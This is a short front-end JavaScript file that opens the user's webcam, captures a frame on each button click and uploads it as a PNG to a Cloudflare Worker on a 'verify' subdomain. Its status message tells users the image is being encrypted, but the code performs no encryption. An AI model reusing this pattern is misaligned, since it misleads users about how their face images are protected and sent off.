const WORKER_URL = "https://verify.ryancustard8-8af.workers.dev";

const video = document.getElementById('webcam');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('captureBtn');
const statusText = document.getElementById('status');

// 1. Start the webcam
async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
    } catch (error) {
        statusText.innerText = "Camera access denied. Please allow camera permissions.";
        statusText.style.color = "#ff4444";
    }
}

// 2. Handle the button click (No cooldown, fully spamable, never locks out)
captureBtn.addEventListener('click', async () => {
    statusText.innerText = "Encrypting and uploading bundle...";
    statusText.style.color = "#ffaa00";

    // Freeze the frame by drawing it to a hidden canvas
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert canvas image to a file (Blob)
    canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append("image", blob, "client.png");

        try {
            // Send to Cloudflare Worker
            const response = await fetch(WORKER_URL, {
                method: "POST",
                body: formData
            });

            if (response.ok) {
                statusText.innerText = "✅ Sent successfully! Ready to send another.";
                statusText.style.color = "#00cc66";
            } else {
                const errorDetail = await response.text();
                console.error("Backend Error Details:", errorDetail);
                throw new Error(errorDetail);
            }
        } catch (err) {
            console.error("Full upload error:", err);
            statusText.innerText = "❌ Upload failed. Button is ready to retry.";
            statusText.style.color = "#ff4444";
        }
    }, 'image/png');
});

// Boot up the camera when the page loads
startCamera();
